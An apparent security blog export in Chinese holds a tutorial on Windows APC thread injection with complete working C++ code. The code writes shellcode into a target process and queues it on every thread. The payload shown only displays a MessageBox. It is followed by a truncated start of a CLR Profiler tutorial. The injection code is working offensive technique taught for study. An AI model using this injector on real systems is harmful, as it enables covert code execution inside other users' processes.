[{"title":"Windows进程注入方法-APC线程注入","url":"/APCInjection/","content":"<h1 id=\"APC线程注入\"><a href=\"#APC线程注入\" class=\"headerlink\" title=\"APC线程注入\"></a>APC线程注入</h1><h2 id=\"0x1-原理\"><a href=\"#0x1-原理\" class=\"headerlink\" title=\"0x1 原理\"></a>0x1 原理</h2><p>步骤其实和远程线程注入差不多，APC注入还需要获取到目标程序都线程句柄，然后使用<code>QueueUserAPC</code>函数注入代码。</p>\n<span id=\"more\"></span>\n\n<blockquote>\n<p><code>QueueUserAPC</code>函数将用户模式异步过程调用(APC)对象添加到指定线程的APC队列中。而在MSDN说明中，操作系统中提供的APC支持允许应用程序将APC对象排队到线程中。每个线程都有自己的APC队列。APC的排队是对线程调用APC函数的请求。操作系统发出软件中断来指导线程调用APC函数。当用户模式APC排队时，除非线程处于可警告状态，否则它不会被指示调用APC函数。在线程处于可警告状态之后，线程以先进先出(FIFO)的顺序处理所有未决的APC，并且等待操作返回WAIT_IO_COMPLETION。线程通过使用<code>SleepEx</code>、<code>SignalObjectAndWait</code>、<code>WaitForSingleObjectEx</code>、<code>WaitForMultipleObjectsEx</code>或<code>MsgWaitForMultipleObjectsEx</code>来执行可警报等待操作，从而进入可警报状态。</p>\n</blockquote>\n<p>APC注入条件：目标程序必须调用SleepEx<code>SleepEx</code>、<code>SignalObjectAndWait</code>、<code>WaitForSingleObjectEx</code>、<code>WaitForMultipleObjectsEx</code>或<code>MsgWaitForMultipleObjectsEx</code>这些函数才能触发注入。</p>\n<h2 id=\"0x2-过程\"><a href=\"#0x2-过程\" class=\"headerlink\" title=\"0x2 过程\"></a>0x2 过程</h2><p>前面几个步骤和远程线程注入一样，这里我直接注入shellcode来弹出MessageBox。</p>\n<ol>\n<li>OpenProcess打开指定进程获取进程句柄</li>\n<li>VirtualAllocEx在目标进程中申请内存空间</li>\n<li>WriteProcessMemory将shellcode写入到申请的内存空间当中</li>\n<li>获取到指定进程的所有线程Id</li>\n<li>QueueUserAPC来对目标进程的所有线程进行Apc注入</li>\n</ol>\n<h2 id=\"0x3-代码\"><a href=\"#0x3-代码\" class=\"headerlink\" title=\"0x3 代码\"></a>0x3 代码</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;Tlhelp32.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">GetThreadIds</span><span class=\"params\">(DWORD dwPId, std::vector&lt;DWORD&gt;&amp; tids)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hSnapshot = ::<span class=\"built_in\">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hSnapshot != INVALID_HANDLE_VALUE) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        THREADENTRY32 te;</span><br><span class=\"line\">        te.dwSize = <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(te);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (::<span class=\"built_in\">Thread32First</span>(hSnapshot, &amp;te))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (te.th32OwnerProcessID == dwPId) </span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    tids.<span class=\"built_in\">push_back</span>(te.th32ThreadID);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">while</span> (::<span class=\"built_in\">Thread32Next</span>(hSnapshot, &amp;te));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hSnapshot);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dwPId &gt; <span class=\"number\">0</span> &amp;&amp; !tids.<span class=\"built_in\">empty</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ApcInect</span><span class=\"params\">(DWORD dwPId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> hexData[<span class=\"number\">404</span>] = &#123;</span><br><span class=\"line\">        <span class=\"number\">0xE9</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x58</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">        <span class=\"number\">0x89</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x70</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x56</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x65</span>,</span><br><span class=\"line\">        <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x25</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xF9</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x4C</span>,</span><br><span class=\"line\">        <span class=\"number\">0x8B</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0xC9</span>,</span><br><span class=\"line\">        <span class=\"number\">0x0F</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x8C</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">        <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x79</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x09</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>,</span><br><span class=\"line\">        <span class=\"number\">0xD1</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xCF</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0xCB</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0xFB</span>, <span class=\"number\">0x61</span>,</span><br><span class=\"line\">        <span class=\"number\">0x8D</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x84</span>,</span><br><span class=\"line\">        <span class=\"number\">0xDB</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xDB</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xD1</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x39</span>, <span class=\"number\">0x5A</span>,</span><br><span class=\"line\">        <span class=\"number\">0x18</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xD9</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xF6</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x40</span>,</span><br><span class=\"line\">        <span class=\"number\">0x0F</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0xFD</span>, <span class=\"number\">0x61</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">        <span class=\"number\">0xFF</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x2B</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0xED</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x3E</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0xF8</span>,</span><br><span class=\"line\">        <span class=\"number\">0x74</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0x4D</span>,</span><br><span class=\"line\">        <span class=\"number\">0x3B</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x5C</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x48</span>,</span><br><span class=\"line\">        <span class=\"number\">0x8B</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x28</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x5F</span>,</span><br><span class=\"line\">        <span class=\"number\">0x41</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x24</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x46</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0xB7</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x41</span>,</span><br><span class=\"line\">        <span class=\"number\">0x8B</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x1C</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x81</span>, <span class=\"number\">0x49</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0xC1</span>, <span class=\"number\">0xEB</span>, <span class=\"number\">0xCB</span>, <span class=\"number\">0xCC</span>,</span><br><span class=\"line\">        <span class=\"number\">0x40</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8B</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xD0</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x73</span>,</span><br><span class=\"line\">        <span class=\"number\">0x65</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0xB7</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xDA</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xEA</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xFC</span>,</span><br><span class=\"line\">        <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xD4</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x2E</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xD8</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xE0</span>,</span><br><span class=\"line\">        <span class=\"number\">0x53</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xE4</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x69</span>,</span><br><span class=\"line\">        <span class=\"number\">0x6F</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xC7</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xF4</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0xC7</span>,</span><br><span class=\"line\">        <span class=\"number\">0x45</span>, <span class=\"number\">0xF8</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x21</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x9D</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0xD0</span>, <span class=\"number\">0xFF</span>,</span><br><span class=\"line\">        <span class=\"number\">0xD0</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0x9E</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x8D</span>,</span><br><span class=\"line\">        <span class=\"number\">0x45</span>, <span class=\"number\">0xE0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x8D</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0xF0</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xD0</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0xC0</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xC4</span>, <span class=\"number\">0x50</span>,</span><br><span class=\"line\">        <span class=\"number\">0x5D</span>, <span class=\"number\">0xC3</span>, <span class=\"number\">0xCC</span>, <span class=\"number\">0xCC</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    CHAR szDllPath[] = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\TestDll.dll&quot;</span>;</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    LPVOID lpRemoteBuff = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    BOOL bRet = FALSE;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> nNumberOfBytesWritten;</span><br><span class=\"line\">    HANDLE hThread = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    DWORD dwTId = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPId);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!hProcess)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] OpenProcess faild\\r\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] OpenProcess success, pid:%d\\r\\n&quot;</span>, dwPId);</span><br><span class=\"line\"></span><br><span class=\"line\">    lpRemoteBuff = <span class=\"built_in\">VirtualAllocEx</span>(</span><br><span class=\"line\">        hProcess,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        <span class=\"number\">0x1000</span>,</span><br><span class=\"line\">        MEM_RESERVE | MEM_COMMIT,</span><br><span class=\"line\">        PAGE_EXECUTE_READWRITE</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!lpRemoteBuff)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] VirtualAllocEx faild\\r\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] VirtualAllocEx success, lpRemoteDllBuff: %p\\r\\n&quot;</span>, lpRemoteBuff);</span><br><span class=\"line\"></span><br><span class=\"line\">    bRet = <span class=\"built_in\">WriteProcessMemory</span>(</span><br><span class=\"line\">        hProcess,</span><br><span class=\"line\">        lpRemoteBuff,</span><br><span class=\"line\">        hexData,</span><br><span class=\"line\">        <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(hexData),</span><br><span class=\"line\">        &amp;nNumberOfBytesWritten</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!lpRemoteBuff)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] WriteProcessMemory faild\\r\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] WriteProcessMemory success, nNumberOfBytesWritten: %zd\\r\\n&quot;</span>, nNumberOfBytesWritten);</span><br><span class=\"line\"></span><br><span class=\"line\">    std::vector&lt;DWORD&gt; vtThreadIds;</span><br><span class=\"line\">    bRet = <span class=\"built_in\">GetThreadIds</span>(dwPId, vtThreadIds);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!bRet)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] Get thread id faild\\r\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Get thread Id success, num: %d\\r\\n&quot;</span>, vtThreadIds.<span class=\"built_in\">size</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Start Apc inject\\r\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (DWORD&amp; dwThreadId : vtThreadIds)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        HANDLE hThread = ::<span class=\"built_in\">OpenThread</span>(THREAD_SET_CONTEXT, FALSE, dwThreadId);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!hThread) </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] OpenThread faild, threadId: %d\\r\\n&quot;</span>, dwThreadId);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            bRet = ::<span class=\"built_in\">QueueUserAPC</span>((PAPCFUNC)lpRemoteBuff, hThread, (ULONG_PTR)<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!bRet)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] QueueUserAPC faild, threadId: %d\\r\\n&quot;</span>, dwThreadId);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> </span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] QueueUserAPC success, threadId: %d\\r\\n&quot;</span>, dwThreadId);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">CloseHandle</span>(hThread);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    bRet = <span class=\"built_in\">VirtualFreeEx</span>(hProcess, lpRemoteBuff, <span class=\"number\">0</span>, MEM_RELEASE);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!bRet)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] VirtualFreeEx faild\\r\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] VirtualFreeEx success\\r\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc &lt; <span class=\"number\">2</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;useage: ApcInjection &lt;pid&gt;\\r\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">ApcInect</span>(<span class=\"built_in\">atoi</span>(argv[<span class=\"number\">1</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x4-参考\"><a href=\"#0x4-参考\" class=\"headerlink\" title=\"0x4 参考\"></a>0x4 参考</h2><blockquote>\n<p><a href=\"https://github.com/3gstudent/Inject-dll-by-APC\">https://github.com/3gstudent/Inject-dll-by-APC</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows"]},{"title":"CLRProfiler","url":"/CLRProfiler/","content":"<h1 id=\"0x01-介绍\"><a href=\"#0x01-介绍\" class=\"headerlink\" title=\"0x01 介绍\"></a>0x01 介绍</h1><p>根据微软<a href=\"https://docs.microsoft.com/zh-cn/dotnet/framework/unmanaged-api/profiling/profiling-overview\">MSDN文档的描述</a>，公共语言运行时探查器(CLR Profiler) 是一个动态链接库 (DLL)，具有使用分析 API 从 CLR 中接收消息以及向 CLR 发送消息的功能。 CLR 在运行时加载探查器 DLL。</p>\n<span id=\"more\"></span>\n\n<p>简单来说就是.Net程序执行时发生以下操作和事件的相关信息时，就会通知调用CLR Profiler相对应的回调函数：</p>\n<ul>\n<li>CLR 启动和关闭事件。</li>\n<li>应用程序域创建和关闭事件。</li>\n<li>程序集加载和卸载事件。</li>\n<li>模块加载和卸载事件。</li>\n<li>COM vtable 创建和析构事件。</li>\n<li>实时 (jIT) 编译和代码间距调整事件。</li>\n<li>类加载和卸载事件。</li>\n<li>线程创建和析构事件。</li>\n<li>函数入口和退出事件。</li>\n<li>异常。</li>\n<li>托管和非托管代码执行之间的转换。</li>\n<li>不同运行时上下文之间的转换。</li>\n<li>有关运行时挂起的信息。</li>\n<li>有关运行时内存堆和垃圾回收活动的信息</li>\n</ul>\n<p>开发CLR Profiler需要使用到C++和Com组件。</p>\n<h1 id=\"0x02-ATL项目\"><a href=\"#0x02-ATL项目\" class=\"headerlink\" title=\"0x02 ATL项目\"></a>0x02 ATL项目</h1><p>ATL是ActiveX Template Library 的缩写，它是一套C++模板库。使用ATL能够快速地开发出高效、简洁的代码（Effective and Slim code），同时对COM组件的开发提供最大限度的代码自动生成以及可视化支持。</p>\n<p>这里使用VS2019来创建项目</p>\n<h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2><p>选择ATL-Project</p>\n<p><img src=\"ATL.png\"></p>\n<p>配置就使用默认，然后点击OK</p>\n<p><img src=\"ATLSetting.png\"></p>\n<p>Visual Studio帮我们创建了两个项目，后缀PS暂时不用管，只关注第一个项目</p>\n<p><img src=\"ATLTwoProject.png\"></p>\n<p>在<code>Properties/Linker/General/Register Output -&gt; No</code>将项目的自动注册功能关闭，不需要把dll注册到注册表中</p>\n<p><img 